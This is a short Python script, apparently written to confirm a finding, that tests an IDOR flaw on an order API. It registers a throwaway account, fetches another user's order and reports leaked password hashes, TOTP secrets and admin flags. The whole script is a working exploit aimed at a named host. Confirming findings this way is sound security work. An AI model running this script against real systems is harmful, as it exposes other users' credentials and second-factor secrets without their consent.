     1	#!/usr/bin/env python3
     2	"""Verify: Horizontal IDOR on GET /orders/{id} — any authenticated caller
     3	can retrieve another user's order (bcrypt hash, TOTP secret, admin flag).
     4	
     5	The script self-registers a fresh attacker account and then requests a
     6	low-numbered order id it certainly does not own. If HTTP 200 comes back
     7	with owner_* fields for a different user_id, the endpoint is still
     8	vulnerable.
     9	
    10	Optional environment variables:
    11	    TARGET_URL     Base URL (default: https://api.taintedport.com)
    12	    PROBE_ID       Order id to probe (default: 1)
    13	
    14	Usage:
    15	    python3 verify.py
    16	"""
    17	import os, sys, time, requests, urllib3
    18	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    19	
    20	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    21	PROBE_ID = int(os.environ.get("PROBE_ID", "1"))
    22	
    23	
    24	def check():
    25	    email = f"verify-idor-{int(time.time())}-{os.getpid()}@example.com"
    26	    r = requests.post(f"{TARGET_URL}/auth/register",
    27	                      json={"name": "V", "email": email, "password": "Verify!Idor-2026"},
    28	                      verify=False, timeout=15)
    29	    if r.status_code not in (200, 201):
    30	        print(f"[ERROR] registration failed HTTP {r.status_code}: {r.text[:200]}")
    31	        sys.exit(1)
    32	    js = r.json()
    33	    token = js["token"]
    34	    attacker_uid = js["user"]["id"]
    35	
    36	    r = requests.get(f"{TARGET_URL}/orders/{PROBE_ID}",
    37	                     headers={"Authorization": f"Bearer {token}"},
    38	                     verify=False, timeout=15)
    39	    if r.status_code != 200:
    40	        print(f"[NOT VULNERABLE] GET /orders/{PROBE_ID} returned HTTP {r.status_code}")
    41	        sys.exit(1)
    42	    try:
    43	        o = r.json()["order"]
    44	    except Exception as e:
    45	        print(f"[NOT VULNERABLE] Unexpected body: {e}")
    46	        sys.exit(1)
    47	
    48	    owner_uid = o.get("user_id")
    49	    leaks = [k for k in ("owner_password_hash", "owner_totp_secret", "owner_is_admin")
    50	             if k in o]
    51	
    52	    if owner_uid != attacker_uid and "owner_password_hash" in o and o.get("owner_password_hash"):
    53	        print(f"[VULNERABLE] Attacker user_id={attacker_uid} read order {PROBE_ID} "
    54	              f"owned by user_id={owner_uid}; leaked fields: {leaks}; "
    55	              f"hash_prefix={o['owner_password_hash'][:10]}")
    56	        sys.exit(0)
    57	    else:
    58	        print(f"[NOT VULNERABLE] Response did not include cross-account owner "
    59	              f"credential material (attacker_uid={attacker_uid} owner_uid={owner_uid})")
    60	        sys.exit(1)
    61	
    62	
    63	if __name__ == "__main__":
    64	    check()